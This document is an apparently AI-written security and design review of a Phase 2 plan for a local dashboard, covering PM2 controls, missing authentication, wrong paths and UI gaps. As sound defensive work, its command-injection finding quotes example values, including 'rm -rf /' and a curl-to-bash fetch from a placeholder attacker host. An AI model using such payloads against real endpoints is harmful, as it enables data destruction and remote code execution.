# Phase 2 Plan Review — 🎯 Critic

**Reviewer:** Critic (Opus)  
**Date:** 2026-03-30  
**Plan:** `PHASE2-PLAN.md`  
**Key question:** _"What will go wrong with this plan?"_

---

## ✅ What's Good

1. **Parallel execution is well-structured.** Wave 1 splits cleanly — Settings, Services, Activity have no cross-dependencies. Quick Actions correctly deferred to Wave 2 since it depends on Settings.

2. **Follows existing patterns.** Express Router → mount in `server/index.js`, React pages in `src/pages/`, `useApi` hook for fetching, `useI18n`/`useConfig` context usage — all consistent with Phase 1.

3. **Stub replacement strategy is sound.** The StubPage components in `App.jsx` map 1:1 with the planned pages. Just swap the import — clean.

4. **RecentActivityWidget wire-up is planned.** Good that it's explicitly called out for Phase 2 data migration.

5. **i18n key naming follows existing conventions.** `settings.*`, `services.*`, `activity.*` align with the `widget.*`, `setup.*`, `nav.*` patterns already in `en.json`.

6. **Widget order on Home page uses existing `WIDGET_MAP` pattern** — adding quick actions to Home is additive, not a refactor.

---

## ❌ Blockers (Must Fix Before Starting)

### B1. **Command Injection in PM2 Routes — CRITICAL SECURITY**

The plan specifies:
```
POST /api/services/pm2/:name/:action — exec `pm2 restart|stop|start :name`
```

If `:name` is `"foo; rm -rf /"` or `"$(curl attacker.com/shell.sh | bash)"`, this is **remote code execution**. The server has zero authentication (CORS only restricts browser origin, not curl/scripts).

**Fix (mandatory):**
- **Whitelist actions:** Only allow `start`, `stop`, `restart`. Reject anything else.
- **Validate `:name` against live PM2 process list** — fetch `pm2 jlist` first, extract valid names, reject any `:name` not in that set.
- **Never interpolate user input into shell strings.** Use `execFile('pm2', [action, name])` (array args) instead of `exec(\`pm2 ${action} ${name}\`)`. `execFile` does not invoke a shell, so injection is impossible.
- **Add the same pattern to actions routes** — use a hardcoded action map, never let the `:id` parameter reach a shell.

### B2. **Command Injection in Actions Routes — CRITICAL SECURITY**

```
POST /api/actions/:id/execute — run the action
```

The plan lists actions like `restart-gateway` → `openclaw gateway restart`. If this uses a lookup map (ID → command string) and the ID is validated, it's fine. But:

- The plan doesn't specify the implementation. If `:id` reaches a shell, or if users can define custom actions with arbitrary commands (via config), it's RCE.

**Fix (mandatory):**
- **Hardcode the action map server-side.** Actions must be a `const` object, not read from user config.
- Use `execFile` with array args, never template-string `exec`.
- The `quickActions` config should only store which action IDs to _display_, never the commands themselves.

### B3. **No Authentication Layer**

The server binds on port 3100 with `cors({ origin: 'http://localhost:5173' })`. CORS only restricts browsers — anyone on the network (or localhost) can `curl` the PM2 exec endpoints. In production (static file serving mode), there's no CORS check at all.

**Fix (mandatory for PM2/actions routes, recommended for all):**
- Add a shared-secret header check (e.g., read a token from `~/.openclaw/hub-config.json` on startup, require it in `Authorization` header for mutating endpoints).
- At minimum: bind to `127.0.0.1` only (not `0.0.0.0`) in production mode. The current `app.listen(PORT)` binds all interfaces by default.
- Shield should review this in Wave 3, but the architecture needs to be in the plan NOW, not bolted on later.

---

## ⚠️ Concerns (With Specific Fixes)

### C1. **Session Data Source Doesn't Exist**

The plan says Activity reads `~/.openclaw/sessions/`. **This directory does not exist** on the current system. The only "sessions" directory is `~/.openclaw/completions/` which contains shell completion scripts (`.bash`, `.fish`, `.zsh`), not session data.

The existing `discover.js` checks both `~/.openclaw/sessions/` and `~/.openclaw/completions/` and found 0 JSON files because there are none.

**Fix:**
- Verify where OpenClaw actually stores session data. It might be in memory only, or in a database, or not persisted at all.
- The Activity backend MUST handle "directory doesn't exist" gracefully — return empty array, not crash.
- Add a "fresh install" empty state to the plan (the frontend has one, but the backend route spec doesn't mention it).

### C2. **Plugin Path Mismatch**

The plan says: `GET /api/services/plugins — scan ~/.openclaw/plugins/`

But `discover.js` (which already exists!) scans `~/.openclaw/hub-plugins/`. Neither directory exists on this machine. The actual OpenClaw plugin configuration lives in `openclaw.json` under a `plugins` key.

**Fix:**
- Align with `discover.js` path (`hub-plugins`), or better yet, read the `plugins` key from `openclaw.json` (like `gateway.js` reads the config file).
- Document which path is canonical.

### C3. **Duplication with `discover.js`**

The plan creates `server/routes/services.js` that does PM2 listing, plugin scanning, and skill scanning. But `server/routes/discover.js` **already does all three** (`checkPm2()`, `listPlugins()`, `listSkills()`). This is unnecessary duplication.

**Fix:** Either:
- **Extend `discover.js`** with the detailed PM2 jlist endpoint and action endpoints, OR
- **Import the helper functions** from discover.js into services.js, OR
- **Deprecate discover.js** and consolidate into services.js

Don't have two files scanning the same directories with slightly different logic.

### C4. **Widget Drag Reorder Needs a Library**

The plan mentions "drag or up/down buttons" for widget order in Settings. Drag-and-drop requires a library (`@dnd-kit/core`, `react-beautiful-dnd`, etc.). **None is in `package.json`.** 

**Fix:**
- Either add a DnD dependency to the plan (recommend `@dnd-kit/core` — lightweight, maintained), OR
- Scope it to up/down buttons only (simpler, no new dependency), and add drag as a later enhancement.

### C5. **"Redo Setup Wizard" Will Lose Current Settings**

Clearing `setupComplete` sends the user back to `SetupWizard`, which initializes with hardcoded defaults:
```js
const [wizState, setWizState] = useState({
  name: '',
  language: detectLanguage(),
  theme: 'dark',
  ...
});
```

All current customization is lost. The wizard doesn't read existing config to pre-populate.

**Fix:**
- The "redo wizard" flow should pass existing config values as initial state to `SetupWizard`.
- Either modify `SetupWizard` to accept initial values via props/context, or create a `useEffect` that loads current config into wizard state.
- This should be in the plan, not discovered during implementation.

### C6. **PM2 Not Installed — No Graceful Handling**

`discover.js` has `checkPm2()` but the services route plan doesn't mention what happens when PM2 isn't installed. `pm2 jlist` will throw, and without a try/catch or pre-check, it'll 500.

**Fix:**
- Check PM2 availability before calling `pm2 jlist`. Return `{ available: false, processes: [] }` if missing.
- Disable action buttons in the frontend when PM2 isn't available.

### C7. **No Rate Limiting on Exec Endpoints**

`POST /api/services/pm2/:name/:action` and `POST /api/actions/:id/execute` can be spammed. Rapid restart/stop cycles could crash services.

**Fix:**
- Add a simple per-endpoint cooldown (e.g., 5s between actions on the same process). Can be in-memory, doesn't need Redis.
- Return `429 Too Many Requests` with remaining cooldown time.

### C8. **File Count Mismatch in Summary**

The plan says "Create (8 files)" but only lists 6:
1. `server/routes/services.js`
2. `server/routes/activity.js`
3. `server/routes/actions.js`
4. `src/pages/Settings.jsx`
5. `src/pages/Services.jsx`
6. `src/pages/Activity.jsx`

That's 6, not 8. Either 2 files are missing from the list, or the count is wrong.

**Fix:** Correct the count to 6, or identify the missing 2 files.

### C9. **i18n "Batch at the End" Is Risky**

> "Add keys as components are built, translate in a single batch at the end."

This is fine for non-English translations. But the English keys should be added to `en.json` **as each component is built**, not batched. Otherwise Pixel will be building and testing UI with raw key strings (`settings.title` instead of "Settings"), making visual QA impossible during development.

**Fix:** Clarify: English keys added per-component (immediately), other 7 languages translated in batch at end.

### C10. **No Error/Loading States Specified for New Pages**

The existing widgets (SystemHealth, Gateway) have explicit error/loading handling patterns. The plan doesn't specify these for the new pages. Services page fetching PM2 data, Activity page reading sessions — both need:
- Loading skeleton
- Error state
- Empty state
- Retry mechanism

The `useApi` hook provides `{ data, loading, error, refetch }` but each page needs to render all four states.

**Fix:** Add a UI states section to each page spec: loading, error, empty, and populated.

### C11. **Skills Scanning — SKILL.md Parsing Not Specified**

The plan says skills show "name, description from SKILL.md." But parsing SKILL.md requires reading markdown files, extracting the first heading and description line. This is non-trivial if SKILL.md files have varied formats.

**Fix:** Specify the parsing logic. Recommend: read first `# ` heading as name, first non-empty paragraph after heading as description. Set a max read size (e.g., 1KB per file) to avoid reading huge files.

---

## 📋 Additional Notes

- **The `~/.openclaw/completions/` directory** contains shell completion scripts, NOT session completions. Activity route should NOT scan this directory (despite `discover.js` doing so).
- **BottomNav.jsx** hardcodes 5 items (Home, Activity, Tasks, Services, Settings). These won't need changes since the routes already match. ✅
- **Sidebar.jsx** reads `config.enabledPages` — Settings page's "toggle pages on/off" feature maps to this correctly. ✅
- The wizard saves `enabledPages: ['home', 'activity', 'costs', 'kanban', 'services', 'notifications']` — note that `'settings'` is NOT in this array, but Settings is rendered separately in the sidebar footer. This is correct. ✅

---

## Verdict: **NEEDS REVISION** ❌

### Must address before execution:
1. **B1 + B2:** Command injection protection (use `execFile` with array args, validate against whitelists)
2. **B3:** Bind to localhost only + add auth for mutating endpoints
3. **C1:** Verify session data source exists and specify fallback behavior
4. **C2:** Fix plugin path to match existing code
5. **C3:** Resolve duplication with `discover.js`

### Should address (strong recommendation):
6. **C4:** Decide DnD library or scoped to buttons
7. **C5:** Handle redo-wizard state preservation
8. **C8:** Fix file count

### Can address during implementation:
9. **C6, C7, C9, C10, C11** — important but won't block starting

---

_Reviewed by 🎯 Critic — "The plan is 80% there. The security gaps are the real blockers. Fix the exec patterns and auth before any agent writes a single line of server code."_
